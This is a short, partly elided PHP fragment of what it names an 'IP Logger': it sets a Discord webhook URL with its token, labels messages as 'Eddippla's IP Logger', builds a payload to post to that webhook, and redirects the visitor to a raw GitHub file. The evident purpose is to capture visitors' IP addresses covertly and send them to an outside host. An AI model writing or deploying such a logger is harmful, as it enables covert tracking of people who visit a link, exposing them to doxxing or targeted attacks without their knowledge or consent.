...
//Variables
$Webhook    = "https://discord.com/api/webhooks/939546395742973963/nMBY1A-MOuqsrcK4L78VTypmPI3niliOriBZw1GG9QQ0NKd7VBsQvAcbX88S5otPsVK2"; //Webhook here.

$WebhookTag = "Showcase"; //This will be the name of the webhook when it sends a message.

//JS we are going to send to the webhook.
$JS = array(
    'username'   => "$WebhookTag - Eddippla's IP Logger" ,
...
header("Location: https://raw.githubusercontent.com/its1mpuleALT/impulsescripts/main/logz.php");
?>
